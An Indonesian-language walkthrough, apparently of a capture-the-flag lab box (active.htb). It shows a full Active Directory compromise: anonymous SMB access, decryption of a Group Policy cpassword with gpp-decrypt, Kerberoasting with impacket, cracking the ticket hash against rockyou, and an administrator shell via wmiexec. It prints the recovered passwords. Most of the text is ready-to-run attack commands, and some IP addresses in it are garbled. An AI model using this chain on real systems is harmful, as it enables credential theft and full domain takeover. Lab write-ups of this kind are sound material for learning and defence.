# Memanfaatkan Kesalahan Konfigurasi Windows Umum

## Reconnaissance

```bash
nmap -Pn -sC -sV <IP>
```

## DNS Enumeration

Kita arahkan dnsrecon ke layanan aktif pada port 53. Alat ini akan mencoba melakukan transfer zona, yang, jika berhasil, akan mengungkapkan semua entri DNS dalam basis data.

```bash
uv run dnsrecon -d target.com  -a
```

## SMB Enumeration

Enum4linux adalah alat yang hebat untuk mengotomatiskan enumerasi mesin Windows. Saya suka menjalankannya dalam mode verbose agar saya dapat melihat lebih banyak detail tentang jenis kueri yang dijalankannya. 

```bash
enum4linux -v target.com
```

Kita juga mempelajari bahwa kita dapat melakukan pemetaan ke Replikasi dengan pengguna dan kata sandi kosong menggunakan perintah berikut. 

```bash
smbclient -W 'WORKGROUP' //'target.com'/'Replication' -U''%''
```

Kita dapat menelusuri folder melalui smbclient atau mengunduh seluruh struktur dengan [smbget](https://www.samba.org/samba/docs/current/man-html/smbget.1.html).

Di dalam berkas Replikasi ini, kita sampai pada berkas bernama Groups.xml yang berisi nama pengguna. `svc_tgs` dan sebuah nilai bernama cpassword, yang tampaknya merupakan kata sandi terenkripsi untuk pengguna ini.

Sedikit pencarian di Google mengingatkan kita bahwa cpassword adalah kata sandi yang dienkripsi AES, tetapi Microsoft secara tidak sengaja mempublikasikan kunci enkripsi yang digunakan, sehingga kita dapat membalikkan enkripsi ini tanpa banyak kesulitan menggunakan gpp-decrypt. 

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ 
GPPstillStandingStrong2k18 
```

Sekarang setelah kita memiliki nama pengguna dan kata sandi, kita dapat menggunakannya untuk terhubung ke folder bersama pengguna. 

```bash
smbclient -W 'WORKGROUP' //'target.com'/'Users' -U'svc_tgs'%'GPPstillStandingStrong2k18'
```

## Privilege Escalation

Ini cukup mudah, tetapi untuk keperluan enumerasi, Anda dapat menggunakan Bloodhound untuk memetakan domain dan kemudian menggunakan kueri bawaan untuk mencantumkan pengguna yang "kerberoastable". 

```bash
bloodhound-python -d target.com -ns <NS> -c All -u svc_tgs -p GPPstillStandingStrong2k18
```

Dalam hal ini, Administrator bekerja dengan baik dan dapat disajikan dengan salad segar! Alat-alat ini tersedia dari impacket, yang dapat diinstal melalui git.

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

```bash
./GetUserSPNs.py -request active.htb/svc_tgs -dc-ip  10.129  .  178.216 
```

Sekarang setelah kita memiliki kuncinya, kunci tersebut dapat dipecahkan dengan cepat menggunakan JTR. 

```bash
john --format:krb5tgs admin.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

Terakhir, kita masuk sebagai Administrator menggunakan alat Impacket lain yang disebut wmiexec.py 

```bash
/home/backspace/tools/impacket/examples/wmiexec.py active.htb/administrator:Ticketmaster1968@  10.129  .178  .216 
```